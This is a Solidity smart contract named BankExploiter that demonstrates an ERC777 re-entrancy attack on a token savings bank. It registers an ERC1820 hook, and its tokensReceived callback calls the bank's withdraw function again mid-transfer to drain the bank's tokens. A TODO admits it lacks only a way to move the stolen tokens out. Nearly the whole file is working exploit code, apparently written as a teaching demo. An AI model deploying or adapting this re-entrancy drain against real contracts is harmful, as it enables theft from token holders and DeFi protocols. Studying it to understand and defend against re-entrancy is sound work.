// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC777} from "@openzeppelin/contracts@4.9.0/token/ERC777/IERC777.sol";
import {IERC777Recipient} from "@openzeppelin/contracts@4.9.0/token/ERC777/IERC777Recipient.sol";
import {IERC1820Registry} from "@openzeppelin/contracts@4.9.0/utils/introspection/IERC1820Registry.sol";
import {IERC1820Implementer} from "@openzeppelin/contracts@4.9.0/utils/introspection/IERC1820Implementer.sol";

interface IERC777Bank {
    function accountBalances(address victim) external returns (uint256);
    function withdraw(address recipient) external;
    function deposit(uint256 amount) external;
}

/// @title An exploitative ERC777 Bank Saver that demonstrates ERC777 re-entrancy vulnerability
/// @author Yves
/// @notice Savings Token is an ERC777 contract
/// @dev TODO: It is missing a way to take out the stolen tokens
contract BankExploiter is IERC777Recipient, IERC1820Implementer {
    IERC777 public savingsToken;
    IERC777Bank public bank;
    IERC1820Registry internal constant ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bool private isReentering;

    constructor(address savingsToken_, address bank_, address master) {
        savingsToken = IERC777(savingsToken_);
        bank = IERC777Bank(bank_);
        ERC1820_REGISTRY.setManager(address(this), master);
    }

    function withdraw() external {
        bank.withdraw(address(this));
    }

    function save(uint256 amount) external {
        bytes memory data = "";
        /// erc777 send
        savingsToken.send(address(bank), amount, data);
    }

    /// will be called with savingsToken.send(recipient, amount, data);
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        operator;
        from;
        to;
        userData;
        operatorData;

        if (from == address(bank) && !isReentering) {
            uint256 bounty = savingsToken.balanceOf(address(bank));
            if (bounty < amount) {
                isReentering = true;
                return;
            }

            bank.withdraw(address(this));
        }
    }

    /**
     * @dev Returns a special value (`ERC1820_ACCEPT_MAGIC`) if this contract
     * implements `interfaceHash` for `account`.
     *
     * See {IERC1820Registry-setInterfaceImplementer}.
     */
    function canImplementInterfaceForAddress(bytes32 interfaceHash, address account) external view returns (bytes32) {
        interfaceHash;
        account;
        return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    }
}
